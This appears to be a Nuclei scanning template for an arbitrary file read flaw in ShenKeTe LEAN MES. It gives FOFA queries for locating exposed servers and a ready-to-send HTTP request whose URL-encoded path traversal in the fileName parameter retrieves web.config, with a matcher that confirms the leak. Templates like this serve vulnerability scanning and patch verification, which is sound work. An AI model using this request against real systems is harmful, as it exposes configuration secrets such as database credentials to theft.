id: ShenKeTe-LEAN-MES-DownLoad_aspx-File-Reading

info:
  name: 深科特 LEAN MES /ESOP/DownLoad.aspx 任意文件读取
  author: HuanXiong
  severity: medium
  description: |-
    fofa: (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
    深科特 LEAN MES /ESOP/DownLoad.aspx 接口存在任意文件读取漏洞，攻击者可以通过构造恶意参数读取服务器上的敏感文件，可能导致敏感信息泄露，如数据库配置、系统文件等。
  reference:
    -
  tags: File-Reading, ShenKeTe, LEAN-MES

http:
  - raw:
      - |-
        GET /ESOP/DownLoad.aspx?fileName=%2e%2e%2f%2e%2e%2f%77%65%62%2e%63%6f%6e%66%69%67&Action=PLM HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
        Accept: */*
        Connection: keep-alive

    matchers:
      - type: dsl
        name: 任意文件读取
        dsl:
          - "status_code == 200 && contains_all(body, '郑重声明', '<appSettings>', '</appSettings>')"